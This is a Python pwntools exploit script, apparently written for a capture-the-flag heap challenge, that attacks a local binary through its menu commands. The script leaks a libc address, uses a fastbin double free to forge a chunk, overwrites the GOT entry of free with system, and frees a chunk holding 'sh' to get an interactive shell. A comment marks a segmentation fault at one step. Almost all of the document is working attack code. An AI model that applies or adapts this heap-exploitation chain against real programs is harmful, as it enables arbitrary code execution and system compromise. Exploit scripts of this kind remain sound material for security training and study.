#!/usr/bin/python
# -*- coding: utf-8 -*-


import struct
from pwn import *;


system_off = 0x3f480;
free_got   = 0x0602018;


############## utils ##################


def readlines():
  res = ''
  while r.can_recv():
    res = res + r.recvline()
  return res


def getaddress(s):
  result = 0
  for i in range(0, 8):
    b = ord(s[i])
    if b != 0x0a:
      result += b * pow(256, i)
    else:
      break
  return result


def getaddress_after(p, s):
  index = s.find(p)

  if index != -1 :
    name = s[index+len(p):]
    return getaddress(name)
  else:
    return -1


############## commands ##################


def alloc(nom, id):
  r.sendline('1')
  r.sendline(nom)
  r.sendline(id)


def free_id(idx):
  r.sendline('3')
  r.sendline(str(idx))
  r.sendline('1')


def free_name(idx):
  r.sendline('3')
  r.sendline(str(idx))
  r.sendline('2')


def edit_id(idx, val):
  r.sendline('5')
  r.sendline(str(idx))
  r.sendline(val)


def show():
  r.sendline('2')


def quit():
  r.sendline('6')


def pwn():
  ############# I. leak libc ####################
  # element[0]
  alloc('A' * 0xb0, 'A')

  # element[1]
  alloc('B', 'B')
  free_name(0)

  # discard previous STDOUT ouput
  readlines()

  show()
  log.info('reading leak address')
  pause()
  out = readlines()

  leak = getaddress_after('-> nom : ', out)

  if leak == -1:
    log.error('could not find name properties')
  else:
    libc = leak - 0x399b58
    system = libc + system_off

    log.info('Leak: ' + hex(leak))
    log.info('Libc: ' + hex(libc))
    log.info('system: ' + hex(system))

    # element[2]
    alloc('C', 'C')

    ############# II. fastbin attack ####################
    # element[3]
    # write a fake chunk header starting at 0x20 from start of this chunk
    # a further malloc will give us this fake chunk so we can overflow
    # the array of pointer of the next element
    alloc('sh', 'XXXXXXXXYYYYYYYYZZZZZZZZ' + struct.pack('<Q', 0x7f))

    # element[4]
    alloc('D', 'D')

    free_id(4)
    free_id(3)
    free_id(4)

    # discard previous STDOUT ouput
    readlines()

    show()
    log.info('reading fd pointer to create a fake chunk in previous heap region')
    pause()
    out = readlines()

    # looking for fd address of element[4] chunk
    fake_chunk_addr = getaddress_after('ment[4]\t-> id : ', out)

    if fake_chunk_addr == -1:
      log.error('could not find id properties of element[4]')
    else:
      # add 0x20 shifting to begin of fake chunk
      fake_chunk_addr += 0x20
      log.info('Address to be used for fake chunk: '+hex(fake_chunk_addr))

      #  element[5]
      alloc('E', struct.pack('<Q', fake_chunk_addr))

      # overwrite array of pointers
      alloc('H', 'A' * 0x58 + struct.pack('<Q', free_got)) # <--- Segmentation fault ici

      # overwrite GOT address of free with address of system
      edit_id(4, struct.pack('<Q', system))

      # launch /bin/sh
      free_name(3)

      r.interactive()


if __name__ == "__main__":
    r = process(['/usr/bin/ltrace', '-o', 'out.trace', './prog.bin', '96'])
    pause()
    pwn()
